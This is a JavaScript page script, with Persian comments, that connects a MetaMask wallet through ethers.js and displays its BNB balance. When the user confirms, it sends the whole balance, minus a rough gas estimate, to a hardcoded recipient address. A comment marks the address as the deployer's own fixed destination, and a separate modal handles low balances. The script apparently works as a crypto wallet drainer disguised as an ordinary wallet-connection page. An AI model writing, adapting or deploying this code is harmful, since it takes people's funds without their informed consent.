// main.js (برای ethers.js v6 و متامسک در موبایل با WalletConnect v2)
import { ethers } from "ethers";

const connectButton = document.getElementById("connectWallet");
const sendButton = document.getElementById("sendTx");
const addressSpan = document.getElementById("address");
const balanceSpan = document.getElementById("balance");
const walletInfo = document.getElementById("walletInfo");

let provider;
let signer;
let userAddress;

connectButton.addEventListener("click", async () => {
  if (typeof window.ethereum === "undefined") {
    alert("MetaMask is not installed!");
    return;
  }

  try {
    provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();
    userAddress = await signer.getAddress();

    const balance = await provider.getBalance(userAddress);
    const bnb = ethers.formatEther(balance);

    addressSpan.innerText = userAddress;
    balanceSpan.innerText = bnb + " BNB";

    if (parseFloat(bnb) < 0.002) {
      openModal('lowBalanceModal');
    } else {
      openModal('confirmTransactionModal');
    }

    walletInfo.style.display = "block";
  } catch (err) {
    console.error("Error connecting wallet:", err);
    alert("Wallet connection failed.");
  }
});

sendButton.addEventListener("click", async () => {
  try {
    const balance = await provider.getBalance(userAddress);
    const gasEstimate = ethers.parseUnits("0.001", "ether"); // حدودی
    const amountToSend = balance - gasEstimate;

    if (amountToSend <= 0n) {
      alert("Not enough balance to cover gas fees");
      return;
    }

    const tx = await signer.sendTransaction({
      to: "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05", // جایگزین با آدرس مقصد ثابت شما
      value: amountToSend
    });

    await tx.wait();
    alert("Transaction successful!");
  } catch (err) {
    console.error("Transaction failed:", err);
    alert("Transaction failed.");
  }
});







function openModal(id) {
  document.getElementById(id).style.display = "flex";
}

function closeModal(id) {
  document.getElementById(id).style.display = "none";
}













